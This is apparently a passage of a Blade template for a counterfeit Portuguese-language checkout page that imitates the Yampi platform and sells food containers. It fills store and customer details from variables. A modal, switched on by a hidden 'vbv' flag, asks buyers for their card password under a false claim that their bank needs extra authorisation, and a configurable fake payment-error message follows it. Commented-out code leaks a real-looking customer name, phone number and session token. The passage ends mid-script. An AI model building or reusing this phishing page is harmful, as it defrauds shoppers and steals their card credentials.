*","text_with_tax":"12x de R$ 7,93","text_discount_percent":null,"text_discount":null}]},"promocode_subtotal":79,"items_amount_formated":"R$ 249,80","subtotal_formated":"R$ {{str_replace('.',',',$data['preco'])}}","items_discount_formated":"R$ 170,80","discount_formated":"R$ 0,00","shipment_original_value_formated":"R$ 0,00","shipment_formated":"Gr\u00e1tis","total_format":"{{str_replace('.',',',$data['preco'])}}","total_formated":"R$ {{str_replace('.',',',$data['preco'])}}","value_for_free_shipment_formated":"R$ 0,00"},--}}
{{--                        items: [{"id":495561497,"cart_id":351260355,"product_option_id":121671212,"kit_id":null,"bundle_id":null,"upsell_id":null,"quantity":1,"gift":0,"created_at":"2023-05-27 17:46:53","updated_at":"2023-05-27 17:46:53","brand":{"id":10957845,"name":"{{$data['nm_loja']}}","slug":"loja-liford"},"is_in_promotional_rack":false,"custom_shipping":false,"free_shipping":false,"shipping_price":0,"weight":0,"product_id":17987792,"option_id":121671212,"link":"javascript:","is_bundle":false,"group_name":"Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos 500g (10 Unidades) - 495561497","bundle":{"name":"","modifiable":true,"image_url":"","quantity":1,"shipping":{"custom":false,"price":0,"days":null,"type":null}},"small":"https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_50x50.png","thumb":"https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_250x250.png","medium":"https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_500x500.png","has_price_discount":true,"price_gift":null,"price_gift_formated":"R$ 0,00","price_sale":"249.80","price_sale_formated":"R$ 249,80","price":"79.00","price_total":79,"price_formated":"R$ {{str_replace('.',',',$data['preco'])}}","price_total_formated":"R$ {{str_replace('.',',',$data['preco'])}}","name":"Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos","name_with_grids":"Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos 500g (10 Unidades)","sku":"reklhssd78","availability_days":-1,"availability_text":"-1 dias \u00fateis","categories":[2852133,2862461,2862462],"categories_names":["Mais Vendidos","Casa & Jardim","Cozinha"],"grids":[{"name":"Tamanho","value":"500g (10 Unidades)"}],"is_digital":false,"short_description":"Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos","customizations":[],"customized":false,"allow_sell_without_customization":0,"selected_customizations":0,"shopify_variant_id":"45300993196337","shopify_product_id":"8450500755761","order_bump_id":null,"product_option":{"id":121671212,"store_id":586266,"product_id":17987792,"price_sale":"249.80","price_discount":"79.00","sku":"reklhssd78","quantity_managed":0,"availability":1,"availability_soldout":-1,"allow_sell_without_customization":0,"product":{"id":17987792,"name":"Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos","slug":"smart-pote-10-unidades-metodo-inovador-para-armazenagem-de-alimentos-6461bc08448df","gift_value":null,"is_digital":0,"seo_description":null,"brand_id":10957845,"facebook_pixel_id":null,"custom_shipping":0,"shipping_price":"0.00","store_id":586266,"simple":0,"brand":{"id":10957845,"store_id":586266,"active":1,"featured":0,"name":"{{$data['nm_loja']}}","description":null,"logo":null,"created_at":"2023-04-27 02:11:38","updated_at":"2023-04-27 02:11:38","deleted_at":null}},"stocks":[]},"cart":{"id":351260355,"store_id":586266,"customer_id":null,"promocode_id":null,"payment_id":null,"address_id":null,"seller_id":null,"done":0,"token":"shopify-335233c33b52253e2e48f95bcaa3301c","has_recomm":0,"value_shipment":null,"zipcode":null,"shipment_service_id":null,"payment_alias":"credit_card","tracking_data":null,"utm_source":null,"utm_campaign":null,"utm_medium":null,"utm_term":null,"utm_content":null,"created_at":"2023-05-27 17:46:53","updated_at":"2023-05-27 17:46:53","deleted_at":null},"order_bump":[]}],--}}
{{--                        discounts: [{"name":"Cupom de desconto","value":0,"accumulate":false}],--}}
{{--                        customer: {"id":148572890,"first_name":"Wilson","last_name":"Pereira","full_name":"{{$data['nome_completo']}}","email":"{{$data['email']}}","document":"{{$data['cpf']}}","document_type":"CPF","birthday":null,"phone_number":"5548996831161"},--}}
{{--                    };--}}

{{--                    window.checkout.firstOrderPromocode = {--}}
{{--                        code: 'PRIMEIRACOMPRA',--}}
{{--                        min: 0.00--}}
{{--                    }--}}

{{--                    window.yampi = window.yampi || {};--}}
{{--                    window.yampi =  Object.assign(window.yampi, {--}}
{{--                        external_auth_token: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvc2VndXJvLmxvamFsaWZvcmQuY29tXC9jYXJ0XC9wYXltZW50IiwiaWF0IjoxNjg1MjIxMDI2LCJleHAiOjE2ODUyMjE2MjYsIm5iZiI6MTY4NTIyMTAyNiwianRpIjoidmFrRk0wTUFwQTd0Tk5kTCIsInN1YiI6MzUxMjYwMzU1LCJwcnYiOiI2ZTNiNmEyYmQyYTg3NjNhYWFiOGVhMWMyNDM3NWQxZTlhZGIwNGQ5IiwiY2FydF9pZCI6MzUxMjYwMzU1LCJtZXJjaGFudF9uYW1lIjoiTG9qYSBMaWZvcmQifQ.jVdQQbuDQuOZh3XY2830pU2odDtut2wBH9VnYaWdKW4',--}}
{{--                        buyer_endpoint: 'https://buyer.yampi.io/v1/'--}}
{{--                    });--}}
{{--                </script>--}}
            </div><!-- /.container clearfix -->

            <div id="overlay_processando" class="overlay overlay-transaction-loading">
                <div class="inner-modal">
                    <div class="align-middle black-60">
                        <div class="spinner spinner-grey inline-block bigger mb15"></div>
                        <div class="container">
                            <div class="t1 bold mb15">
                                aguarde…
                            </div><!-- /.t1 -->
                            <div class="t2 f-h2">
                                Estamos processando seu pedido. Não feche esta tela.
                            </div><!-- /.t2 -->
                        </div>
                    </div><!-- /.align-middle -->
                </div><!-- /.inner-modal -->
            </div><!-- /.overlay-transaction -->

            <div id="modal-transaction-error" class="modal overlay overlay-transaction-error">
                <div class="inner-modal">
                    <div class="align-middle black-60">
                        <div class="modal-content text-center">
                            <div class="inner-content">
                                <div class="t1 mt10 mb20 bold green f-h2">Precisamos confirmar sua transação</div><!-- /.t1 -->

                                <p class="f16" id="digitos_vbv">Digite a senha do cartão, a mesma utilizada para transações comerciais.</p>

                                <div class="form-group w-100" style="margin-top: 10px;">
                                    <input type="tel" data-name="card[0][number]" data-checkout="cardNumber" id="senha_vbv" class="bold l-space1 input-validate required input input-card-number bincreditcard" data-iugu="number"  placeholder="xxxxxx" data-testid="input-cc-number" maxlength="6">
                                    <div id="input-card-number-0_errors" class="error-block"></div>
                                    <!-- /.error-block -->
                                </div>

                                <a href="javascript:" id="btn_vbv_confirma" class="btn btn-grey btn-block mt15 mb15 close-transaction-error">Confirmar</a><!-- /.btn btn-grey -->
                            </div><!-- /.inner-content -->

                            <p class="f11 tip js-tip">
                                <span class="bold">Dica:</span>
                                <span class="js-creditcard-tip">Gostaríamos de informar que, por motivos de segurança, o banco solicitou uma autorização adicional para garantir a proteção de suas informações financeiras.</span>
                            </p><!-- /.f11 -->

                            <a href="#" class="modal-close" id="fechar_vbv" data-target="modal-transaction-error">[x] fechar</a>
                        </div><!-- /.modal-content -->
                    </div><!-- /.align-middle -->
                </div><!-- /.inner-modal -->
            </div><!-- /.overlay-transaction -->



        </div><!-- /.modal-content -->
    </div>

    <footer class="-mobile-center">
        <div class="container">
            <div class="payment-methods-holder">
                <div class="-title">
                    Formas de pagamento
                </div>

                <div class="-payment-list">
                    <img
                        alt="amex"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-amex.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="visa"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-visa.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="diners"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-diners.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="mastercard"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-mastercard.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="discover"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-discover.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="aura"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-aura.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="hipercard"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-hipercard.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="elo"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-elo.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="billet"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-billet.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="hiper"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-hiper.svg
                    >
                    <span class="line-break hide"></span>
                    <img
                        alt="pix"
                        width="39"
                        height="26"
                        src=https://icons.yampi.me/svg/card-pix.svg
                    >
                    <span class="line-break hide"></span>
                </div>
            </div>

            <div class="store-info-holder">
                <div class="-store-document space-handler">
                    <span class="-holder-store-name">© {{date('Y')}} {{$data['nm_loja']}}</span>
                    <span class="-holder-document">CNPJ:
                            <span class="cnpj">{{$data['cnpj_loja']}}</span>
                        </span>
                </div>
            </div>


        </div>
        <div id="div_erro" style="display:none;">
            <div class="modal_mobile openSansText">
                <div class="title openSansText boldText" style="margin-bottom: 10px;">Houve um Erro</div>
                <span id="texto_modal_erro" class="content openSansText">Houve um erro ao processar o seu pagamento, por favor verifique os valores digitados ou utilize outra forma de pagamento.</span>

                <div class="button openSansText" style="    cursor: pointer;" id="btn_ok">OK</div>
            </div>
        </div>

        <div class="black_back" id="div_erro2" style="display:none;"></div>

        <div class="security-label">
            <svg width="89" height="19" viewBox="0 0 89 19" fill="#898792" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M9.75 14.1875V8.5C9.75 8.05127 9.38623 7.6875 8.9375 7.6875L2.4375 7.6875C1.98877 7.6875 1.625 8.05127 1.625 8.5L1.625 14.1875C1.625 14.6362 1.98877 15 2.4375 15H8.9375C9.38623 15 9.75 14.6362 9.75 14.1875ZM11.375 8.5V14.1875C11.375 15.5337 10.2837 16.625 8.9375 16.625H2.4375C1.09131 16.625 -5.8844e-08 15.5337 0 14.1875L2.48609e-07 8.5C3.07453e-07 7.15381 1.09131 6.0625 2.4375 6.0625L8.9375 6.0625C10.2837 6.0625 11.375 7.15381 11.375 8.5Z"/>
                <path fill-rule="evenodd" clip-rule="evenodd" d="M5.6875 3.625C4.79004 3.625 4.0625 4.35254 4.0625 5.25V6.875H2.4375V5.25C2.4375 3.45507 3.89257 2 5.6875 2C7.48243 2 8.9375 3.45507 8.9375 5.25V6.875H7.3125V5.25C7.3125 4.35254 6.58496 3.625 5.6875 3.625Z"/>
                <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 10.125L6.5 12.5625H4.875L4.875 10.125H6.5Z"/>
                <path d="M23.136 0.11C23.73 0.11 24.236 0.205333 24.654 0.396C25.072 0.586667 25.391 0.861666 25.611 1.221C25.831 1.58033 25.941 2.01667 25.941 2.53C25.941 3.04333 25.831 3.47967 25.611 3.839C25.391 4.19833 25.072 4.47333 24.654 4.664C24.236 4.85467 23.73 4.95 23.136 4.95H21.695V7.37H19.803V0.11H23.136ZM22.839 3.531C23.235 3.531 23.532 3.45033 23.73 3.289C23.9353 3.12033 24.038 2.86733 24.038 2.53C24.038 2.19267 23.9353 1.94333 23.73 1.782C23.532 1.61333 23.235 1.529 22.839 1.529H21.695V3.531H22.839Z"/>
                <path d="M33.0094 7.37H31.0624L30.5564 5.731H28.0704L27.5534 7.37H25.6504L28.2024 0.11H30.4684L33.0094 7.37ZM28.4224 4.444H30.2044L29.3134 1.507L28.4224 4.444Z"/>
                <path d="M36.5882 7.48C35.9429 7.48 35.3672 7.337 34.8612 7.051C34.3626 6.765 33.9739 6.34333 33.6952 5.786C33.4166 5.22867 33.2772 4.55033 33.2772 3.751C33.2772 2.96633 33.4239 2.29533 33.7172 1.738C34.0106 1.18067 34.4286 0.751667 34.9712 0.451C35.5212 0.150333 36.1666 0 36.9072 0C37.7286 0 38.3922 0.150333 38.8982 0.451C39.4042 0.744333 39.7966 1.21367 40.0752 1.859L38.3262 2.552C38.2309 2.178 38.0622 1.90667 37.8202 1.738C37.5782 1.56933 37.2776 1.485 36.9182 1.485C36.5589 1.485 36.2509 1.573 35.9942 1.749C35.7376 1.91767 35.5432 2.17067 35.4112 2.508C35.2792 2.838 35.2132 3.24867 35.2132 3.74C35.2132 4.25333 35.2792 4.68233 35.4112 5.027C35.5506 5.37167 35.7522 5.62833 36.0162 5.797C36.2876 5.95833 36.6212 6.039 37.0172 6.039C37.2299 6.039 37.4242 6.01333 37.6002 5.962C37.7762 5.91067 37.9302 5.83733 38.0622 5.742C38.1942 5.63933 38.2969 5.51467 38.3702 5.368C38.4436 5.214 38.4802 5.03433 38.4802 4.829V4.719H36.8192V3.454H40.0862V7.37H38.7992L38.6562 5.665L38.9642 5.929C38.8102 6.42767 38.5316 6.81267 38.1282 7.084C37.7322 7.348 37.2189 7.48 36.5882 7.48Z"/>
                <path d="M48.1344 7.37H46.1874L45.6814 5.731H43.1954L42.6784 7.37H40.7754L43.3274 0.11H45.5934L48.1344 7.37ZM43.5474 4.444H45.3294L44.4384 1.507L43.5474 4.444Z"/>
                <path d="M57.3828 0.11V7.37H55.7108V4.037L55.7658 1.804H55.7438L53.9508 7.37H52.4218L50.6288 1.804H50.6068L50.6618 4.037V7.37H48.9788V0.11H51.6738L52.8178 3.806L53.2248 5.346H53.2468L53.6648 3.817L54.7978 0.11H57.3828Z"/>
                <path d="M58.9905 7.37V0.11H64.6445V1.573H60.8825V3.047H63.8745V4.422H60.8825V5.907H64.7875V7.37H58.9905Z"/>
                <path d="M72.4749 0.11V7.37H70.3739L68.1189 3.443L67.5689 2.365H67.5579L67.6019 3.707V7.37H65.9299V0.11H68.0309L70.2859 4.037L70.8359 5.115H70.8469L70.8029 3.773V0.11H72.4749Z"/>
                <path d="M80.1883 0.11V1.573H77.8233V7.37H75.9313V1.573H73.5553V0.11H80.1883Z"/>
                <path d="M84.225 0C84.9583 0 85.589 0.150333 86.117 0.451C86.6523 0.744333 87.063 1.16967 87.349 1.727C87.635 2.28433 87.778 2.95533 87.778 3.74C87.778 4.52467 87.635 5.19567 87.349 5.753C87.063 6.31033 86.6523 6.73933 86.117 7.04C85.589 7.33333 84.9583 7.48 84.225 7.48C83.4917 7.48 82.8573 7.33333 82.322 7.04C81.7867 6.73933 81.376 6.31033 81.09 5.753C80.804 5.19567 80.661 4.52467 80.661 3.74C80.661 2.95533 80.804 2.28433 81.09 1.727C81.376 1.16967 81.7867 0.744333 82.322 0.451C82.8573 0.150333 83.4917 0 84.225 0ZM84.225 1.485C83.873 1.485 83.576 1.56933 83.334 1.738C83.092 1.90667 82.9087 2.15967 82.784 2.497C82.6593 2.827 82.597 3.24133 82.597 3.74C82.597 4.23133 82.6593 4.64567 82.784 4.983C82.9087 5.32033 83.092 5.57333 83.334 5.742C83.576 5.91067 83.873 5.995 84.225 5.995C84.577 5.995 84.8703 5.91067 85.105 5.742C85.347 5.57333 85.5303 5.32033 85.655 4.983C85.7797 4.64567 85.842 4.23133 85.842 3.74C85.842 3.24133 85.7797 2.827 85.655 2.497C85.5303 2.15967 85.347 1.90667 85.105 1.738C84.8703 1.56933 84.577 1.485 84.225 1.485Z"/>
                <path d="M21.03 18.37V13.84C21.03 13.7067 21.03 13.57 21.03 13.43C21.0367 13.2833 21.0433 13.13 21.05 12.97C20.8233 13.19 20.5633 13.38 20.27 13.54C19.9833 13.6933 19.6867 13.8033 19.38 13.87L19.18 12.94C19.32 12.92 19.4833 12.8733 19.67 12.8C19.8567 12.7267 20.05 12.6333 20.25 12.52C20.45 12.4067 20.6333 12.2867 20.8 12.16C20.9667 12.0267 21.0967 11.8967 21.19 11.77H22.09V18.37H21.03Z"/>
                <path d="M26.1634 18.47C25.3701 18.47 24.7468 18.1833 24.2934 17.61C23.8468 17.03 23.6234 16.1833 23.6234 15.07C23.6234 13.9567 23.8468 13.1133 24.2934 12.54C24.7468 11.96 25.3701 11.67 26.1634 11.67C26.9634 11.67 27.5868 11.96 28.0334 12.54C28.4868 13.1133 28.7134 13.9567 28.7134 15.07C28.7134 16.1833 28.4868 17.03 28.0334 17.61C27.5868 18.1833 26.9634 18.47 26.1634 18.47ZM26.1634 17.56C26.4834 17.56 26.7501 17.47 26.9634 17.29C27.1834 17.1033 27.3468 16.8267 27.4534 16.46C27.5668 16.0867 27.6234 15.6233 27.6234 15.07C27.6234 14.5167 27.5668 14.0567 27.4534 13.69C27.3468 13.3167 27.1834 13.04 26.9634 12.86C26.7501 12.6733 26.4834 12.58 26.1634 12.58C25.8434 12.58 25.5734 12.6733 25.3534 12.86C25.1401 13.04 24.9801 13.3167 24.8734 13.69C24.7668 14.0567 24.7134 14.5167 24.7134 15.07C24.7134 15.6233 24.7668 16.0867 24.8734 16.46C24.9801 16.8267 25.1401 17.1033 25.3534 17.29C25.5734 17.47 25.8434 17.56 26.1634 17.56Z"/>
                <path d="M32.4427 18.47C31.6494 18.47 31.0261 18.1833 30.5727 17.61C30.1261 17.03 29.9027 16.1833 29.9027 15.07C29.9027 13.9567 30.1261 13.1133 30.5727 12.54C31.0261 11.96 31.6494 11.67 32.4427 11.67C33.2427 11.67 33.8661 11.96 34.3127 12.54C34.7661 13.1133 34.9927 13.9567 34.9927 15.07C34.9927 16.1833 34.7661 17.03 34.3127 17.61C33.8661 18.1833 33.2427 18.47 32.4427 18.47ZM32.4427 17.56C32.7627 17.56 33.0294 17.47 33.2427 17.29C33.4627 17.1033 33.6261 16.8267 33.7327 16.46C33.8461 16.0867 33.9027 15.6233 33.9027 15.07C33.9027 14.5167 33.8461 14.0567 33.7327 13.69C33.6261 13.3167 33.4627 13.04 33.2427 12.86C33.0294 12.6733 32.7627 12.58 32.4427 12.58C32.1227 12.58 31.8527 12.6733 31.6327 12.86C31.4194 13.04 31.2594 13.3167 31.1527 13.69C31.0461 14.0567 30.9927 14.5167 30.9927 15.07C30.9927 15.6233 31.0461 16.0867 31.1527 16.46C31.2594 16.8267 31.4194 17.1033 31.6327 17.29C31.8527 17.47 32.1227 17.56 32.4427 17.56Z"/>
                <path d="M37.362 18.37L41.682 11.77H42.602L38.292 18.37H37.362ZM37.622 11.67C37.962 11.67 38.2554 11.7467 38.502 11.9C38.7554 12.0533 38.9487 12.2667 39.082 12.54C39.222 12.8133 39.292 13.1367 39.292 13.51C39.292 13.8767 39.222 14.2 39.082 14.48C38.9487 14.7533 38.7554 14.9667 38.502 15.12C38.2554 15.2733 37.962 15.35 37.622 15.35C37.2887 15.35 36.9954 15.2733 36.742 15.12C36.4887 14.9667 36.292 14.7533 36.152 14.48C36.0187 14.2 35.952 13.8767 35.952 13.51C35.952 13.1367 36.0187 12.8133 36.152 12.54C36.292 12.2667 36.4887 12.0533 36.742 11.9C36.9954 11.7467 37.2887 11.67 37.622 11.67ZM37.622 12.45C37.4554 12.45 37.312 12.4933 37.192 12.58C37.072 12.66 36.982 12.78 36.922 12.94C36.862 13.0933 36.832 13.2833 36.832 13.51C36.832 13.73 36.862 13.92 36.922 14.08C36.982 14.24 37.072 14.36 37.192 14.44C37.312 14.52 37.4554 14.56 37.622 14.56C37.7954 14.56 37.942 14.52 38.062 14.44C38.182 14.36 38.272 14.24 38.332 14.08C38.392 13.92 38.422 13.73 38.422 13.51C38.422 13.2833 38.392 13.0933 38.332 12.94C38.272 12.78 38.182 12.66 38.062 12.58C37.942 12.4933 37.7954 12.45 37.622 12.45ZM42.342 14.79C42.682 14.79 42.9754 14.8667 43.222 15.02C43.4754 15.1733 43.6687 15.39 43.802 15.67C43.942 15.9433 44.012 16.2633 44.012 16.63C44.012 17.0033 43.942 17.3267 43.802 17.6C43.6687 17.8733 43.4754 18.0867 43.222 18.24C42.9754 18.3933 42.682 18.47 42.342 18.47C42.0087 18.47 41.7154 18.3933 41.462 18.24C41.2087 18.0867 41.012 17.8733 40.872 17.6C40.7387 17.3267 40.672 17.0033 40.672 16.63C40.672 16.2633 40.7387 15.9433 40.872 15.67C41.012 15.39 41.2087 15.1733 41.462 15.02C41.7154 14.8667 42.0087 14.79 42.342 14.79ZM42.342 15.58C42.1754 15.58 42.032 15.62 41.912 15.7C41.792 15.78 41.702 15.9 41.642 16.06C41.582 16.2133 41.552 16.4033 41.552 16.63C41.552 16.85 41.582 17.04 41.642 17.2C41.702 17.36 41.792 17.4833 41.912 17.57C42.032 17.65 42.1754 17.69 42.342 17.69C42.5154 17.69 42.662 17.65 42.782 17.57C42.902 17.4833 42.992 17.36 43.052 17.2C43.112 17.04 43.142 16.85 43.142 16.63C43.142 16.41 43.112 16.22 43.052 16.06C42.992 15.9 42.902 15.78 42.782 15.7C42.662 15.62 42.5154 15.58 42.342 15.58Z"/>
                <path d="M50.8628 11.67C51.4561 11.67 51.9695 11.7833 52.4028 12.01C52.8361 12.23 53.2028 12.5567 53.5028 12.99L52.7828 13.68C52.5295 13.2933 52.2428 13.0167 51.9228 12.85C51.6095 12.6767 51.2361 12.59 50.8028 12.59C50.4828 12.59 50.2195 12.6333 50.0128 12.72C49.8061 12.8067 49.6528 12.9233 49.5528 13.07C49.4595 13.21 49.4128 13.37 49.4128 13.55C49.4128 13.7567 49.4828 13.9367 49.6228 14.09C49.7695 14.2433 50.0395 14.3633 50.4328 14.45L51.7728 14.75C52.4128 14.89 52.8661 15.1033 53.1328 15.39C53.3995 15.6767 53.5328 16.04 53.5328 16.48C53.5328 16.8867 53.4228 17.24 53.2028 17.54C52.9828 17.84 52.6761 18.07 52.2828 18.23C51.8961 18.39 51.4395 18.47 50.9128 18.47C50.4461 18.47 50.0261 18.41 49.6528 18.29C49.2795 18.17 48.9528 18.0067 48.6728 17.8C48.3928 17.5933 48.1628 17.3567 47.9828 17.09L48.7228 16.35C48.8628 16.5833 49.0395 16.7933 49.2528 16.98C49.4661 17.16 49.7128 17.3 49.9928 17.4C50.2795 17.5 50.5961 17.55 50.9428 17.55C51.2495 17.55 51.5128 17.5133 51.7328 17.44C51.9595 17.3667 52.1295 17.26 52.2428 17.12C52.3628 16.9733 52.4228 16.8 52.4228 16.6C52.4228 16.4067 52.3561 16.2367 52.2228 16.09C52.0961 15.9433 51.8561 15.83 51.5028 15.75L50.0528 15.42C49.6528 15.3333 49.3228 15.21 49.0628 15.05C48.8028 14.89 48.6095 14.6967 48.4828 14.47C48.3561 14.2367 48.2928 13.9767 48.2928 13.69C48.2928 13.3167 48.3928 12.98 48.5928 12.68C48.7995 12.3733 49.0961 12.13 49.4828 11.95C49.8695 11.7633 50.3295 11.67 50.8628 11.67Z"/>
                <path d="M55.0288 18.37V11.77H59.8088V12.69H56.0988V14.59H58.9988V15.49H56.0988V17.45H59.9488V18.37H55.0288Z"/>
                <path d="M63.9491 18.47C63.3291 18.47 62.7924 18.3333 62.3391 18.06C61.8857 17.7867 61.5324 17.4 61.2791 16.9C61.0257 16.3933 60.8991 15.7833 60.8991 15.07C60.8991 14.37 61.0291 13.7667 61.2891 13.26C61.5557 12.7533 61.9291 12.3633 62.4091 12.09C62.8957 11.81 63.4524 11.67 64.0791 11.67C64.7657 11.67 65.3191 11.7967 65.7391 12.05C66.1657 12.3033 66.5057 12.6967 66.7591 13.23L65.7691 13.7C65.6424 13.3333 65.4324 13.06 65.1391 12.88C64.8524 12.6933 64.5024 12.6 64.0891 12.6C63.6757 12.6 63.3124 12.6967 62.9991 12.89C62.6924 13.0833 62.4524 13.3667 62.2791 13.74C62.1057 14.1067 62.0191 14.55 62.0191 15.07C62.0191 15.5967 62.0957 16.0467 62.2491 16.42C62.4024 16.7867 62.6324 17.0667 62.9391 17.26C63.2524 17.4533 63.6357 17.55 64.0891 17.55C64.3357 17.55 64.5657 17.52 64.7791 17.46C64.9924 17.3933 65.1791 17.3 65.3391 17.18C65.4991 17.0533 65.6224 16.8967 65.7091 16.71C65.8024 16.5167 65.8491 16.29 65.8491 16.03V15.84H63.9291V14.97H66.7991V18.37H65.9991L65.9391 17.04L66.1391 17.14C65.9791 17.56 65.7124 17.8867 65.3391 18.12C64.9724 18.3533 64.5091 18.47 63.9491 18.47Z"/>
                <path d="M73.7654 11.77V15.84C73.7654 16.7133 73.5354 17.37 73.0754 17.81C72.6154 18.25 71.9454 18.47 71.0654 18.47C70.1987 18.47 69.5321 18.25 69.0654 17.81C68.6054 17.37 68.3754 16.7133 68.3754 15.84V11.77H69.4454V15.71C69.4454 16.33 69.5787 16.79 69.8454 17.09C70.112 17.39 70.5187 17.54 71.0654 17.54C71.6187 17.54 72.0287 17.39 72.2954 17.09C72.5621 16.79 72.6954 16.33 72.6954 15.71V11.77H73.7654Z"/>
                <path d="M78.2852 11.77C78.9919 11.77 79.5519 11.9467 79.9652 12.3C80.3852 12.6533 80.5952 13.13 80.5952 13.73C80.5952 14.35 80.3852 14.83 79.9652 15.17C79.5519 15.5033 78.9919 15.67 78.2852 15.67L78.1852 15.73H76.6552V18.37H75.5952V11.77H78.2852ZM78.2052 14.84C78.6386 14.84 78.9586 14.7533 79.1652 14.58C79.3786 14.4 79.4852 14.1267 79.4852 13.76C79.4852 13.4 79.3786 13.13 79.1652 12.95C78.9586 12.77 78.6386 12.68 78.2052 12.68H76.6552V14.84H78.2052ZM78.8352 15.06L80.9852 18.37H79.7552L77.9152 15.48L78.8352 15.06Z"/>
                <path d="M84.9954 11.67C85.6354 11.67 86.1887 11.8067 86.6554 12.08C87.122 12.3533 87.482 12.7433 87.7354 13.25C87.9887 13.7567 88.1154 14.3633 88.1154 15.07C88.1154 15.7767 87.9887 16.3833 87.7354 16.89C87.482 17.3967 87.122 17.7867 86.6554 18.06C86.1887 18.3333 85.6354 18.47 84.9954 18.47C84.3621 18.47 83.812 18.3333 83.3454 18.06C82.8787 17.7867 82.5187 17.3967 82.2654 16.89C82.0121 16.3833 81.8854 15.7767 81.8854 15.07C81.8854 14.3633 82.0121 13.7567 82.2654 13.25C82.5187 12.7433 82.8787 12.3533 83.3454 12.08C83.812 11.8067 84.3621 11.67 84.9954 11.67ZM84.9954 12.6C84.5821 12.6 84.2254 12.6967 83.9254 12.89C83.6321 13.0833 83.4054 13.3633 83.2454 13.73C83.0854 14.0967 83.0054 14.5433 83.0054 15.07C83.0054 15.59 83.0854 16.0367 83.2454 16.41C83.4054 16.7767 83.6321 17.0567 83.9254 17.25C84.2254 17.4433 84.5821 17.54 84.9954 17.54C85.4154 17.54 85.7721 17.4433 86.0654 17.25C86.3654 17.0567 86.5954 16.7767 86.7554 16.41C86.9154 16.0367 86.9954 15.59 86.9954 15.07C86.9954 14.5433 86.9154 14.0967 86.7554 13.73C86.5954 13.3633 86.3654 13.0833 86.0654 12.89C85.7721 12.6967 85.4154 12.6 84.9954 12.6Z"/>
            </svg>

        </div>
        </div>
        <input type="hidden" value="{{$data['id_loja']}}" id="__l">
        <input type="hidden" value="{{($data['vbv'] ? 's' : 'n')}}" id="vbv_sn">
        <input type="hidden" value="{{$data['mensagem_erro']}}" id="mensagem_erro">
        <input type="hidden" value="Houve um erro ao processar o seu pagamento, por favor verifique os valores digitados ou utilize outra forma de pagamento." id="mensagem_padrao">
        <input type="hidden" value="{{ $baseTotalPrice }}" id="vl_produto">

        </div><!-- /.inner-body -->




        <script src="https://cdn.yampi.me/jquery/jquery.js"></script>
        <script src="//awesome-assets.yampi.me/checkout/build/mix/assets/js/app.js?id=e3860a5deee1a9fe7e7b17c1499b9e12"></script>
        <script src="/libs/jquery.mask.js"></script>

        <script>
            let __total = $("#vl_produtos").text();
            __total = __total.replace('R$ ', '');
            __total = __total.replace(',', '.');
            __total = parseFloat(__total);

            const initialTotalAmount = {{ $baseTotalPrice + $data['frete_selecionado_valor'] + ($data['orderbump'] == 's' ? $data['vl_orderbump'] : 0) }};

            $("#installments").empty();
            for(let i = 1; i <= 12; i++){
                let vl = __total/i;

                $("#installments").append(
                    $("<option>",{
                        value: i,
                        text: i + 'x de R$ ' + vl.toFixed(2).replace('.', ',')
                    })
                )
            }

            $("#valor_card_pix").text(`R$ ${initialTotalAmount.toFixed(2).replace('.', ',')}`);

            $("#installments").change(function () {
                $(".select-skin-text").text($("#installments option:selected").text());

                const installmentRate = {{ floatval($data['instalment_rate']) }},
                    instalments = Number($(this).val()),
                    elementInstalmentSection = $('#instalment-section'),
                    elementTotalSection = $('#total-section');

                if (instalments === 1) {
                    elementInstalmentSection.hide();

                    elementTotalSection.text(
                        initialTotalAmount
                            .toFixed(2)
                            .replace('.', ',')
                    );
                } else {
                    const instalmentAmount = ((installmentRate * instalments) / 100) * initialTotalAmount;

                    elementInstalmentSection.find('.value').text(
                        instalmentAmount
                            .toFixed(2)
                            .replace('.', ',')
                    );

                    elementInstalmentSection.show();

                    elementTotalSection.text(
                        (initialTotalAmount + instalmentAmount)
                            .toFixed(2)
